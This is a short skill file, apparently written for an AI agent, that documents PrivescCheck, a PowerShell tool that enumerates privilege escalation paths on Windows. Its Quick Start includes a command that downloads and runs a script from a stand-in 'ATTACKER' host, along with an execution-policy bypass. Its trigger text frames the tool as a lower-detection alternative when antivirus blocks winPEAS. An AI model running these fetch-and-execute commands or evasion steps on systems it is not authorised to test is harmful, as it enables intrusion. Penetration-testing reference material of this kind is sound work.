---
name: privesccheck
description: >
  This skill should be used when the user asks about "privesccheck", "winPEAS
  is blocked by AV, for a lower-detection PS1 alternative", "for structured
  readable output with remediation context". Pure PowerShell Windows privilege
  escalation enumeration script checking services, scheduled tasks, registry,
  DLL hijacking, COM hijacking, and stored credentials.
---

# PrivescCheck

Pure PowerShell Windows privilege escalation enumeration.

## Quick Start

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER/PrivescCheck.ps1"); Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report privesc_report -Format HTML
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## Check Categories

| Category | What it enumerates |
|----------|--------------------|
| Services | Unquoted paths, weak DACLs, writable binaries |
| Scheduled Tasks | Writable task scripts/binaries |
| Registry | AlwaysInstallElevated, AutoRun keys |
| Credentials | GPP passwords, stored Windows credentials |
| Current user | Token privileges, group memberships |
| COM objects | Hijackable COM registrations |
| DLL hijacking | PATH/CWD DLL search order abuse |

## Output Severity

| Level | Meaning |
|-------|---------|
| Info | All findings including informational (default) |
| Low | Medium+ severity only |
| Medium | High severity only |

## Resources

| File | When to load |
|------|--------------|
| `references/` | DLL hijack exploitation, COM hijack exploitation |
